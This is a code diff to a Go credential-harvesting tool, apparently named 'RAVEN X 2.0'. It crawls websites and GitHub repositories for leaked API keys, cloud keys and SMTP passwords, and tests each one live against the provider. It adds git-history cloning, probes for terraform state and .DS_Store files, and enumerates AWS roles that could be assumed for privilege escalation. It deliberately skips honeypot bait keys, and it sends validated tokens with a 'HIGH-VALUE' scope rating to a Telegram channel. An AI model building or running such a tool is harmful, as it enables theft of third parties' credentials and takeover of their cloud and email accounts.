@@ -630,70 +630,71 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		AWSAccessKeyPattern:          regexp.MustCompile(`['"](AKIA[0-9A-Z]{16})['"]`),
 		AWSSecretKeyPattern:          regexp.MustCompile(`['"]([A-Za-z0-9/+=]{40})['"]`),
 		SendGridAPIKeyPattern:        regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
-		BrevoAPIKeyPattern:           regexp.MustCompile(`xkeysib-[a-zA-Z0-9]{64}-[a-zA-Z0-9]{16}`),
-		XSMTPAPIKeyPattern:           regexp.MustCompile(`xsmtpsib-[a-fA-F0-9]{64}-[a-zA-Z0-9]{16}`),
+		BrevoAPIKeyPattern:           regexp.MustCompile(`xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}`),
+		XSMTPAPIKeyPattern:           regexp.MustCompile(`xsmtpsib-[a-f0-9]{64}-[a-zA-Z0-9]{16}`),
 		TencentAccessKeyPattern:      regexp.MustCompile(`AKID[a-zA-Z0-9]{32}`),
 		// Legacy Mailgun keys start with "key-"; newer private API keys are
 		// 32-char hex or UUID-style (covered by NewMailgunAPIKeyPattern).
 		// The context fallback catches MAILGUN_API_KEY=<anything> in env files.
-		MailgunAPIKeyPattern:         regexp.MustCompile(`(?:key-[0-9a-zA-Z]{32}|(?i)(?:MAILGUN[_\-]?(?:API[_\-]?)?(?:KEY|SECRET|TOKEN)|MG_API_KEY)["'\s:=]+([a-zA-Z0-9\-]{20,50}))`),
-		MandrillAppAPIKeyPattern:     regexp.MustCompile(`['"]?(md-[0-9a-zA-Z]{22})['"]?`),
+		MailgunAPIKeyPattern:         regexp.MustCompile(`(?:key-[a-z0-9]{32}|(?i)(?:MAILGUN[_\-]?(?:API[_\-]?)?(?:KEY|SECRET|TOKEN)|MG_API_KEY)["'\s:=]+([a-zA-Z0-9\-]{20,55}))`),
+		MandrillAppAPIKeyPattern:     regexp.MustCompile(`(?i)mandrill.{0,40}\b([A-Za-z0-9_-]{22})\b`),
 		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn\.[a-zA-Z0-9_\-]{40,100}`),
 		NewMailgunAPIKeyPattern: regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
-		TwilioSIDPatternInfo:    regexp.MustCompile(`AC[a-f0-9]{32}`),
+		TwilioSIDPatternInfo:    regexp.MustCompile(`AC[0-9a-fA-F]{32}`),
 		TwilioAuthPatternInfo:        regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
 		TwilioAuthPatternV2Info:      regexp.MustCompile(`(?i)<td class="v">([0-9a-f]{32})</td>`),
 		TwilioEncodePatternInfo:      regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
 		NexmoApiPatternInfo:          regexp.MustCompile(`(?i)(NEXMO_API_KEY|VONAGE_API_KEY)\s*[:=]\s*["']?([a-zA-Z0-9]{8})["\']?`),
-		NexmoSecretPatternInfo:       regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["\']?([a-zA-Z0-9]{16})["\']?`),
-		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[0-9a-f]{20,56}(?:_[A-Za-z0-9_\-]{10,30})?`),
+		NexmoSecretPatternInfo:       regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{8,25})["\']?`),
+		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[0-9A-Za-z_\-]{55}`),
 		AWSRandomPattern:             regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`),
 		AWSSMTPHostPattern:           regexp.MustCompile(`(?i)(email-smtp\.[a-z0-9\-]+\.amazonaws\.com)`),
 		DefaultRegion:                "us-east-1",
 		AWSAccessKeyPatternInfo:      regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`),
 		AWSSecretKeyPatternInfo:      regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`),
 		SendGridAPIKeyPatternInfo: regexp.MustCompile(`\bSG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}\b`),
-		MailgunAPIKeyPatternInfo:  regexp.MustCompile(`\bkey-[0-9a-zA-Z]{32}\b`),
+		MailgunAPIKeyPatternInfo:  regexp.MustCompile(`\bkey-[a-z0-9]{32}\b`),
 		// Stripe key formats: secret (sk_*) and restricted (rk_*) — live and test variants.
 		// pk_ (publishable) keys are intentionally excluded: they cannot authenticate
 		// against /v1/balance and only produce wasted 403 roundtrips.
-		StripePattern:                regexp.MustCompile(`(?:sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
+		StripePattern:                regexp.MustCompile(`(?:sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{24,128}`),
 		// OpenAI: modern sk-proj-* / sk-o1-* / sk-svcacct-* keys and long generic sk- keys.
 		// Branch1: T3BlbkFJ marker (modern project keys) — {20,} prefix chars + T3BlbkFJ + {20,} suffix.
 		// Branch2: long tail without marker — {20,} prefix + {28,} suffix = minimum 48 chars after "sk-".
 		// NOTE: classic 48-char legacy keys (sk- + 45 chars) do NOT match branch2 (need 48 not 45).
 		// They can only match if a future format has the T3BlbkFJ marker or if the suffix is ≥28 chars.
-		OpenAIAPIPattern:             regexp.MustCompile(`sk-(?:proj-|o1-|svcacct-)?[a-zA-Z0-9]{20,}(?:T3BlbkFJ[a-zA-Z0-9]{20,}|[a-zA-Z0-9_-]{28,})`),
+		OpenAIAPIPattern:             regexp.MustCompile(`sk-(?:(?:proj|svcacct|admin)-[A-Za-z0-9_-]{58,74}T3BlbkFJ[A-Za-z0-9_-]{58,74}|[a-zA-Z0-9]{20}T3BlbkFJ[a-zA-Z0-9]{20})`),
 		// Anthropic key format: sk-ant-api<N>-<payload> where payload is ≥86 base64url chars.
 		// Two explicit alternatives prevent the regex engine from silently absorbing "api03-"
 		// into the character-class run (all chars in [A-Za-z0-9_-]) when the optional group
 		// is skipped, which would lower the effective minimum by 6 chars.
 		//   Alt 1: with api\d+- prefix — {86,} chars of payload after the separator
 		//   Alt 2: bare sk-ant- (no api prefix) — require {92,} to rule out truncated keys
-		AnthropicPattern:             regexp.MustCompile(`sk-ant-(?:api\d+-[A-Za-z0-9_-]{86,}|[A-Za-z0-9_-]{92,})`),
-		MessageBirdPattern:           regexp.MustCompile(`(?:live|test)_[a-zA-Z0-9]{25,40}`),
+		// TruffleHog: (?:api03|admin01) prefixes confirmed; payload is 93 chars + 'AA' suffix
+		AnthropicPattern:             regexp.MustCompile(`sk-ant-(?:api\d+|admin\d+)-[A-Za-z0-9_-]{86,}`),
+		MessageBirdPattern:           regexp.MustCompile(`(?:live|test)_[a-zA-Z0-9]{25}`),
 		PHPInfoPaths:                 phpinfoPaths,
 		EnvPaths:                     envPaths,
-		SMTPHostPattern:              regexp.MustCompile(`(?i)MAIL_HOST\s*[:=]\s*([^\s'"]+)`),
-		SMTPPortPattern:              regexp.MustCompile(`(?i)MAIL_PORT\s*[:=]\s*([0-9]+)`),
-		SMTPUserPattern:              regexp.MustCompile(`(?i)MAIL_USERNAME\s*[:=]\s*([^\s'"]+)`),
-		SMTPPassPattern:              regexp.MustCompile(`(?i)MAIL_PASSWORD\s*[:=]\s*([^\s'"]+)`),
-		SMTPFromPattern:              regexp.MustCompile(`(?i)MAIL_FROM\s*[:=]\s*([^\s'"]+)`),
+		SMTPHostPattern:              regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|SMTP_ADDRESS|EMAIL_SERVER|SMTP_SERVER)\s*[:=]\s*([^\s'"]+)`),
+		SMTPPortPattern:              regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[:=]\s*([0-9]+)`),
+		SMTPUserPattern:              regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?|EMAIL_HOST_USER|SMTP_USER_NAME)\s*[:=]\s*([^\s'"]+)`),
+		SMTPPassPattern:              regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|EMAIL_HOST_PASSWORD)\s*[:=]\s*([^\s'"]+)`),
+		SMTPFromPattern:              regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM)\s*[:=]\s*([^\s'"]+@[^\s'"]+)`),
 		SMSGatewayPattern:            regexp.MustCompile(`(?i)(?P<service>twilio|vonage|aliyun|smsastral|infobip|nexmo|clickatell|talk2all).*?(?:api[_-]?key|login|username)[\s:=]+(?P<username>[A-Za-z0-9_-]+).*?(?:secret|password|token)[\s:=]+(?P<password>[A-Za-z0-9_-]+)`),
 		DBCredentialsPattern:         regexp.MustCompile(`(?i)(?P<db>mysql|maria(?:db)?|mongodb|phpmyadmin)[\s:]*://(?P<username>[a-zA-Z0-9_.+-]+):(?P<password>[^@]+)@(?P<host>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::(?P<port>\d+))?`),
 		MailValPattern:               regexp.MustCompile(`(?i)(?P<service>zerobounce|neverbounce|bouncer)[\s:=]+(?P<apikey>[A-Za-z0-9_-]{16,64})`),
 		AliyunAccessKeyPattern:       regexp.MustCompile(`(?i)LTAI[A-Z0-9]{16}`),
 		AliyunSecretKeyPattern:       regexp.MustCompile(`(?i)[A-Za-z0-9]{30}`),
-		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+]{40})<\/td>`),
+		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+=]{40})<\/td>`),
 
 		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{100,})['"]`),
 		AWSSESUserPattern:      regexp.MustCompile(`\b(AKIA|ASIA)[A-Z0-9]{16}\b`),
 
 		// ── New (Wave-5) credential patterns ──────────────────────────────
 		// Postmark server token (UUID-ish)
-		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)postmark[^\n]*server[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
-		// Mailjet — API key:secret pair
-		MailjetAPIKeyPattern: regexp.MustCompile(`(?i)mailjet[^\n]*(?:api[_-]?key|public)[\s:=]+([0-9a-f]{32})`),
+		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)postmark[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
+		// Mailjet — API key:secret pair (public and private keys are both 32 alphanum chars)
+		MailjetAPIKeyPattern: regexp.MustCompile(`(?i)(?:mailjet[^\n]*(?:api[_-]?(?:key|secret)|public|private|secret)|MJ_APIKEY_(?:PUBLIC|PRIVATE))[\s:=]+([A-Za-z0-9]{32})`),
 
 		// SMTP Service Patterns
 		SocketLabsSMTPPattern:   regexp.MustCompile(`smtp\.socketlabs\.com`),
@@ -704,7 +705,7 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		MailgunSMTPPattern:      regexp.MustCompile(`smtp\.mailgun\.org`),
 		MailgunEUSMTPPattern:    regexp.MustCompile(`smtp\.eu\.mailgun\.org`),
 		ZeptoMailSMTPPattern:    regexp.MustCompile(`smtp\.zeptomail\.com`),
-		GmailSMTPPattern:        regexp.MustCompile(`smtp-relay\.gmail\.com`),
+		GmailSMTPPattern:        regexp.MustCompile(`smtp(?:-relay)?\.gmail\.com`),
 		MandrillSMTPPattern:     regexp.MustCompile(`smtp\.mandrillapp\.com`),
 		Office365SMTPPattern:    regexp.MustCompile(`smtp\.office365\.com`),
 		BrevoSMTPPattern:        regexp.MustCompile(`smtp\-relay\.brevo\.com`),
@@ -715,7 +716,7 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		// Wave-6 patterns
 		// GitHub personal access tokens — new format (ghp_/gho_/ghs_/ghr_),
 		// fine-grained PATs (github_pat_), and legacy 40-char hex.
-		GitHubTokenPattern: regexp.MustCompile(`(?:ghp_|gho_|ghs_|ghr_|github_pat_)[A-Za-z0-9_]{36,255}`),
+		GitHubTokenPattern: regexp.MustCompile(`(?:ghp_[A-Za-z0-9_]{36}|gho_[A-Za-z0-9_]{36}|ghu_[A-Za-z0-9_]{36}|ghs_[A-Za-z0-9._-]{36,600}|ghr_[A-Za-z0-9_]{76}|github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59})`),
 		// GCP / Google API key: AIza prefix + 35 Base64url chars
 		GCPAPIKeyPattern: regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`),
 		// Ethereum private key: optional 0x prefix + exactly 64 lowercase hex chars
@@ -2198,11 +2199,12 @@ func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
 
 	os.RemoveAll(targetDir)
 
-	// Timeout lebih pendek untuk mencegah hang
-	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	// Fetch last 50 commits across all branches so deleted secrets in recent
+	// history are visible. Full clone is avoided to cap disk/time usage.
+	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, "git", "clone", "--depth", "1", cloneUrl, targetDir)
+	cmd := exec.CommandContext(ctx, "git", "clone", "--no-single-branch", "--depth", "50", cloneUrl, targetDir)
 	if err := cmd.Run(); err != nil {
 		if ctx.Err() == context.DeadlineExceeded {
 			pterm.Debug.Printfln("Clone timeout for %s after 60s", name)
@@ -3193,17 +3195,30 @@ func (a *AWSScanner) CheckGitHubToken(key, sourceURL string) bool {
 	defer resp.Body.Close()
 
 	if resp.StatusCode == 200 {
+		// X-OAuth-Scopes header reveals the token's blast radius before doing
+		// anything else — a token with admin:org + delete_repo + workflow is
+		// effectively root on the organisation.
+		scopes := resp.Header.Get("X-OAuth-Scopes")
 		var res map[string]interface{}
 		json.NewDecoder(resp.Body).Decode(&res)
 		login, _ := res["login"].(string)
 
-		a.logValid("GitHub", fmt.Sprintf("Token: %s | User: %s", key, login))
+		a.logValid("GitHub", fmt.Sprintf("Token: %s | User: %s | Scopes: %s", key, login, scopes))
 		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_github.txt")
-		a.storeValidKeyLimit("GitHub", key, fmt.Sprintf("@%s", login))
+		a.storeValidKeyLimit("GitHub", key, fmt.Sprintf("@%s (scopes: %s)", login, scopes))
 
 		globalCounters.mu.Lock()
 		globalCounters.APIsValidated++
 		globalCounters.mu.Unlock()
+
+		highValueScopes := []string{"admin:org", "delete_repo", "workflow", "admin:repo_hook"}
+		scopeRisk := "🟡 Standard"
+		for _, s := range highValueScopes {
+			if strings.Contains(scopes, s) {
+				scopeRisk = "🔴 HIGH-VALUE"
+				break
+			}
+		}
 
 		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
 ━━━━━━━━━━━━━━━━━━
@@ -3211,8 +3226,10 @@ func (a *AWSScanner) CheckGitHubToken(key, sourceURL string) bool {
 
 🔑 <b>Token:</b> <code>%s</code>
 👤 <b>User:</b> @%s
+🔐 <b>Scopes:</b> <code>%s</code>
+⚡ <b>Risk:</b> %s
 🔗 <b>Source:</b> %s
-`, key, login, sourceURL)
+`, key, login, scopes, scopeRisk, sourceURL)
 		go a.sendTelegram(msg)
 		return true
 	}
@@ -3891,7 +3908,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		}
 	}()
 
-	honeypotBaitPattern := regexp.MustCompile(`(?i)(SK_TEST_9999999999999999|AKIA` + `IOSFODNN7EXAMPLE` + `FAKE|KEY_FAKE_DO_NOT_USE)`)
+	honeypotBaitPattern := regexp.MustCompile(`(?i)(SK_TEST_9999999999999999|AKIA` + `IOSFODNN7EXAMPLE|KEY_FAKE_DO_NOT_USE)`)
 	if honeypotBaitPattern.MatchString(text) {
 		pterm.Error.Printfln("[HONEYPOT DETECTED] Skipping domain due to bait pattern in %s", sourceURL)
 		return
@@ -3899,6 +3916,12 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 
 	// Cegah rekursi dari AST extraction
 	if strings.Contains(sourceURL, "(from AST:") {
+		return
+	}
+
+	// .DS_Store binary — extract directory listing, skip credential regex
+	if strings.Contains(sourceURL, "DS_Store") {
+		a.extractDSStoreFilenames(text, sourceURL)
 		return
 	}
 
@@ -4284,6 +4307,17 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 	// Pengecekan SMTP menggunakan ScanningFeatures
 	a.extractAndTestSMTP(contentToScan, sourceURL)
 
+	// ── Gap-closer passes ────────────────────────────────────────────────────
+	// Shannon entropy: catches non-regex token formats (internal API keys,
+	// HMAC secrets, custom auth tokens) by flagging high-entropy assignments.
+	a.scanEntropyPass(contentToScan, sourceURL)
+	// Webhook URLs: Slack/Discord/PagerDuty embed live auth tokens in URLs.
+	a.scanWebhookURLs(contentToScan, sourceURL)
+	// Firebase: extract projectId and test open Firestore / Realtime DB rules.
+	a.checkFirebaseOpenRules(contentToScan, sourceURL)
+	// Terraform state: walk resources[*].instances[*].attributes JSON tree.
+	a.parseTerraformStateContent(contentToScan, sourceURL)
+
 	// Ekstraksi menggunakan AST - hanya mengambil pola yang sesuai dengan regex yang sudah didefinisikan
 	a.extractValidatorsFromCode(contentToScan, sourceURL)
 
@@ -4582,7 +4616,7 @@ func (a *AWSScanner) isValidSMTPConfig(host, port, user, pass, from string) bool
 	if len(pass) < 4 || len(pass) > 200 {
 		return false
 	}
-	if strings.ContainsAny(pass, "(){}[]<>;|&") {
+	if strings.ContainsAny(pass, "()<>;|&") {
 		return false
 	}
 
@@ -4687,11 +4721,11 @@ func (a *AWSScanner) extractSMTPFromWPConfig(code string) []map[string]string {
 func (a *AWSScanner) extractSMTPFromDockerCompose(code string) []map[string]string {
 	// Treat each line as a potential env var assignment (YAML or .env style inside compose)
 	return (&AWSScanner{
-		SMTPHostPattern: regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST)\s*[=:]\s*["']?([a-zA-Z0-9.\-]+)["']?`),
-		SMTPPortPattern: regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT)\s*[=:]\s*["']?(\d+)["']?`),
-		SMTPUserPattern: regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?)\s*[=:]\s*["']?([^"'\s]+)["']?`),
-		SMTPPassPattern: regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?)\s*[=:]\s*["']?([^"'\s]+)["']?`),
-		SMTPFromPattern: regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM)\s*[=:]\s*["']?([^\s"']+@[^\s"']+)["']?`),
+		SMTPHostPattern: regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|SMTP_ADDRESS|EMAIL_SERVER|SMTP_SERVER)\s*[=:]\s*["']?([a-zA-Z0-9._\-]+)["']?`),
+		SMTPPortPattern: regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[=:]\s*["']?(\d+)["']?`),
+		SMTPUserPattern: regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?|EMAIL_HOST_USER|SMTP_USER_NAME)\s*[=:]\s*["']?([^"'\s]+)["']?`),
+		SMTPPassPattern: regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|EMAIL_HOST_PASSWORD)\s*[=:]\s*["']?([^"'\s]+)["']?`),
+		SMTPFromPattern: regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM)\s*[=:]\s*["']?([^\s"']+@[^\s"']+)["']?`),
 	}).extractSMTPFromEnv(code)
 }
 
@@ -4785,20 +4819,37 @@ func (a *AWSScanner) extractSMTPFromEnv(code string) []map[string]string {
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
 
-		// Host — covers MAIL_HOST, SMTP_HOST, EMAIL_HOST, MAILER_HOST, DB_EMAIL_HOST, etc.
+		// Host — covers MAIL_HOST, SMTP_HOST, EMAIL_HOST, MAILER_HOST, Django EMAIL_HOST, etc.
 		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|EMAIL_SERVER|SMTP_SERVER)\s*[=:]\s*["']?([a-zA-Z0-9.\-]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+			// Flush previous incomplete config when a second MAIL_HOST line appears
+			if config["host"] != "" && (config["user"] != "" || config["pass"] != "") {
+				if config["port"] == "" {
+					config["port"] = "587"
+				}
+				if config["from"] == "" {
+					if strings.Contains(config["user"], "@") {
+						config["from"] = config["user"]
+					} else if config["host"] != "" {
+						config["from"] = config["user"] + "@" + config["host"]
+					}
+				}
+				if config["user"] != "" && config["pass"] != "" {
+					configs = append(configs, config)
+				}
+				config = make(map[string]string)
+			}
 			config["host"] = strings.Trim(match[1], `"'`)
 		}
 		// Port
 		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[=:]\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["port"] = match[1]
 		}
-		// User / username
-		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USERNAME|MAILER_USER(?:NAME)?|EMAIL_USER)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// User / username — includes Django EMAIL_HOST_USER
+		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USERNAME|MAILER_USER(?:NAME)?|EMAIL_USER|EMAIL_HOST_USER)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["user"] = strings.Trim(match[1], `"'`)
 		}
-		// Password
-		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|MAILER_PASS(?:WORD)?|EMAIL_SECRET)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// Password — includes Django EMAIL_HOST_PASSWORD
+		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|MAILER_PASS(?:WORD)?|EMAIL_SECRET|EMAIL_HOST_PASSWORD)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["pass"] = strings.Trim(match[1], `"'`)
 		}
 		// From address (optional — synthesised from user if absent)
@@ -5221,6 +5272,10 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 	if strings.Contains(*identity.Arn, ":user/") {
 		iamAuditResult = a.auditIAMUser(cfg, userOrRole)
 	}
+	// Enumerate assumeable roles — identifies privilege escalation paths
+	// that direct policy inspection misses (e.g. a limited key that can
+	// assume OrganizationAccountAccessRole → AdministratorAccess).
+	go a.auditAssumeableRoles(cfg, ak, sourceURL)
 
 	// Enhanced report format matching main.py style
 	reportLines := []string{}
@@ -5440,6 +5495,7 @@ func (a *AWSScanner) createRequest(domain string) {
 								b, _ := io.ReadAll(io.LimitReader(r.Body, 128*1024))
 								r.Body.Close()
 								a.checkAndSaveKeys(string(b), fullJS)
+								go a.checkJSSAST(string(b), fullJS)
 								// Second-level: extract and scan JS files referenced within this JS file
 								if a.Config.ScanningFeatures.JSScan {
 									subMatches := jsRegex.FindAllStringSubmatch(string(b), -1)
@@ -5625,6 +5681,19 @@ func (a *AWSScanner) createRequest(domain string) {
 				// Go expvar / debug endpoints
 				"/debug/vars",
 				"/debug/pprof/",
+				// macOS Finder metadata — binary file listing server directory tree
+				"/.DS_Store",
+				"/public/.DS_Store",
+				"/static/.DS_Store",
+				"/assets/.DS_Store",
+				// Terraform state — plaintext credentials for every provisioned resource
+				"/terraform.tfstate",
+				"/terraform.tfstate.backup",
+				"/.terraform/terraform.tfstate",
+				"/infra/terraform.tfstate",
+				"/infrastructure/terraform.tfstate",
+				"/deploy/terraform.tfstate",
+				"/tf/terraform.tfstate",
 			)
 		}
 
@@ -5722,6 +5791,18 @@ func (a *AWSScanner) createRequest(domain string) {
 							if strings.Contains(pthLower, "graphql") || strings.Contains(pthLower, "/gql") || pth == "/query" {
 								go a.probeGraphQLIntrospection(fullURL)
 							}
+						}
+						// LIB CVE: query OSV for known vulnerable package versions
+						if a.Config.ScanningFeatures.LibScan {
+							pthLower := strings.ToLower(pth)
+							if isPackageManifest(pthLower) {
+								go a.checkPackageManifestCVEs(string(b), fullURL, pthLower)
+							}
+						}
+						// npm supply chain: typosquat + license + registry age/R2S
+						if a.Config.ScanningFeatures.LibScan {
+							pthLower := strings.ToLower(pth)
+							go a.checkNPMSupplyChain(string(b), fullURL, pthLower)
 						}
 					}
 				}
